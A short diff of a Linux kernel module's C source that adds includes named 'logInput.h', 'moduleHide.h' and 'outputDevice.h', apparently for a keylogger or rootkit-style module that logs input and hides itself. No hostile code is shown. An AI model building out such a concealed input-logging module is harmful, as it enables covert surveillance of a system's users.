@@ -2,6 +2,11 @@
 #include <linux/kernel.h>   // For KERN_INFO
 #include <linux/init.h>     // For init macros
 
+#include "logInput.h"
+#include "moduleHide.h"
+#include "outputDevice.h"
+
+
 static int __init main_init(void) {
   int error;
 
